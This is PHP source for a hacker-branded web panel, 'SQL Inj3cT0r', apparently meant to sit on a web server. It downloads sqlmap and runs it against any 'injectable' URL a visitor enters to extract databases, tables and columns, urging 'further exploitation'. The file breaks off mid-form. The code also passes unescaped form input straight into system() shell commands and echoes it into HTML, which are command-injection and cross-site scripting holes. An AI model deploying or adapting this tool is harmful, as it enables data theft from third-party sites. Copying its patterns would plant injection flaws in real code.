<?php
session_start();
set_time_limit(0);
error_reporting(0);

if (isset($_POST['ss'])) {
    $_SESSION['sqlmap'] = trim($_POST['sqlmap']);
    $_SESSION['launch'] = 1;
}

$head = '
<html>
<head>
<title>--==[[SQL Inj3cT0r By Incredible]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
    font-family: Tahoma;
}
tr {
    BORDER: dashed 1px #333;
    color: #FFF;
}
td {
    BORDER: dashed 1px #333;
    color: #FFF;
}
.table1 {
    BORDER: 0px Black;
    BACKGROUND-COLOR: Black;
    color: #FFF;
}
.td1 {
    BORDER: 0px;
    BORDER-COLOR: #333333;
    font: 7pt Verdana;
    color: Green;
}
.tr1 {
    BORDER: 0px;
    BORDER-COLOR: #333333;
    color: #FFF;
}
table {
    BORDER: dashed 1px #333;
    BORDER-COLOR: #333333;
    BACKGROUND-COLOR: Black;
    color: #FFF;
}
input {
    border: solid 3px;
    border-color: #333;
    BACKGROUND-COLOR: white;
    font: 11pt Verdana;
    color: #333;
}
select {
    BORDER-RIGHT: Black 1px solid;
    BORDER-TOP: #DF0000 1px solid;
    BORDER-LEFT: #DF0000 1px solid;
    BORDER-BOTTOM: Black 1px solid;
    BORDER-color: #FFF;
    BACKGROUND-COLOR: Black;
    font: 8pt Verdana;
    color: Red;
}
submit {
    BORDER: buttonhighlight 2px outset;
    BACKGROUND-COLOR: Black;
    width: 30%;
    color: #FFF;
}
textarea {
    border: dashed 1px #333;
    BACKGROUND-COLOR: Black;
    font: Fixedsys bold;
    color: #999;
}
BODY {
    SCROLLBAR-FACE-COLOR: Black;
    SCROLLBAR-HIGHLIGHT-color: #FFF;
    SCROLLBAR-SHADOW-color: #FFF;
    SCROLLBAR-3DLIGHT-color: #FFF;
    SCROLLBAR-ARROW-COLOR: Black;
    SCROLLBAR-TRACK-color: #FFF;
    SCROLLBAR-DARKSHADOW-color: #FFF;
    margin: 1px;
    color: Red;
    background-color: Black;
}
.main {
    margin: -287px 0px 0px -490px;
    BORDER: dashed 1px #333;
    BORDER-COLOR: #333333;
}
.tt {
    background-color: Black;
}
A:link {
    COLOR: White;
    TEXT-DECORATION: none;
}
A:visited {
    COLOR: White;
    TEXT-DECORATION: none;
}
A:hover {
    color: Red;
    TEXT-DECORATION: none;
}
A:active {
    color: Red;
    TEXT-DECORATION: none;
}
</STYLE>
</head>
<body bgcolor=black>
<h3 style="text-align:center">
<div align=center>
';

echo $head;

echo '
<table width="100%" cellspacing="0" cellpadding="0" class="tb1">
    <tr>
        <td width="100%" align=center valign="top" rowspan="1">
            <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ SQL </font>
            <font color=white size=5 face="comic sans ms"><b>  InJeCt0r </font>
            <font color=green size=5 face="comic sans ms"><b>]]==--</font>
            <div class="hedr"></div>
        </td>
    </tr>
    <tr>
        <td height="10" align="left" class="td1"></td>
    </tr>
    <tr>
        <td width="100%" align="center" valign="top" rowspan="1">
            <font color="red" face="comic sans ms" size="1"><b>
            <font color=#ff9933> ####################################################</font>
            <font color=white>#####################################################</font>
            <font color=green>####################################################</font><br>
            <font size=3 color=#ff9933 face="comic sans ms">
            Love To: <br><font size=2 color=white face="comic sans ms">Surbhi, Mrudu, Hary, Kavi ^_^ </font><br>
            Greetz to : <br><font size=2 color=white face="comic sans ms">Code Breaker ICA , 1046 ^_^ and Team IndiShell </font><br>
            <br></font>
            <font color=#ff9933> ####################################################</font>
            <font color=white>#####################################################</font>
            <font color=green>####################################################</font>
            </b></font>
        </td>
    </tr>
</table>
';

echo '
<body bgcolor=black><h3 style="text-align:center">
<div align=center>
<form method="post">
    <input type="submit" name="dl" value="Download SQLMap">
</form>
';

if (isset($_POST['dl'])) {
    echo "<br> Please wait... I am downloading sqlmap from GitHub :)<br>";
    $tmp = file_get_contents("https://github.com/sqlmapproject/sqlmap/archive/master.zip");
    file_put_contents("sqlmap.zip", $tmp);

    echo "<br> Unpacking SQLMap, please have a cup of tea 8-)<br>";
    $zip = new ZipArchive;
    if ($zip->open('sqlmap.zip') === TRUE) {
        $zip->extractTo('.');
        $zip->close();
    }

    $loc = rename("sqlmap-master", "sqlmap");
    if ($loc) {
        echo "SQLMap is under directory --> " . getcwd() . "/sqlmap";
    }
}

if ($_SESSION['sqlmap'] == '') {
    echo '
    <br><br>
    Please type path of sqlmap.py before proceeding :)<br><br>
    <form method="post">
        <input type="text" name="sqlmap" value="sqlmap location">
        <input type="submit" name="ss" value="Set Value"><p><br><br>
    </form>
    ';
}

echo '<hr></div>';

if ($_SESSION['launch'] == '1') {
    echo '
    <br>
    Type SQL Injection vulnerable URL in the box below<br><br><br>
    <form method="post">
        <input type="text" name="udata" value="Injectable URL ">
        <input type="submit" name="btn" value="Extract Databases"><p>
    </form>
    ';

    if (isset($_POST['btn'])) {
        $url = $_POST['udata'];
        $x = "python " . $_SESSION['sqlmap'] . " -u " . $url . " --batch --dbs";
        echo '<textarea rows=20 cols=100>';
        system($x);
        echo '</textarea>';
        echo "<br> Result has been printed and you can proceed to further exploitation<br><br>";
        echo '
        <form method="post">
            <input type="text" name="url" value="' . $url . '">&nbsp
            <input type="text" name="db" value="Type database name here">&nbsp<p>
            <input type="submit" name="tsubmit" value="Extract Tables">
            <br>
        </form>
        ';
    }

    if (isset($_POST['tsubmit'])) {
        $link = $_POST['url'];
        $db = $_POST['db'];
        $tfinal = "python " . $_SESSION['sqlmap'] . " -u " . $link . " -D " . $db . " --tables --batch";
        echo '<textarea rows=15 cols=100>';
        system($tfinal);
        echo '</textarea>';
        echo "<br> Result showing the table names of the given database.<br> Proceed to column names<br><br>";
        echo '
        <form method="post">
            <input type="text" name="url" value="' . $link . '">&nbsp
            <input type="text" name="dbs" value="' . $db . '">&nbsp
            <input type="text" name="tbl" value="Enter table name here"><br><br>
            <input type="submit" name="csubmit" value="Extract Columns">
            <br>
        </form>
        ';
    }

    if (isset($_POST['csubmit'])) {
        $clink = $_POST['url'];
        $tbl = $_POST['tbl'];
        $db = $_POST['dbs'];
        $cfinal = "python " . $_SESSION['sqlmap'] . " -u " . $clink . " -D " . $db . " -T " . $tbl . " --columns --batch --level=3 --risk=3";
        echo '<textarea rows=20 cols=100>';
        system($cfinal);
        echo '</textarea>';
        echo "<br> Showing the results for column names..<br><br>";
        echo '
        <
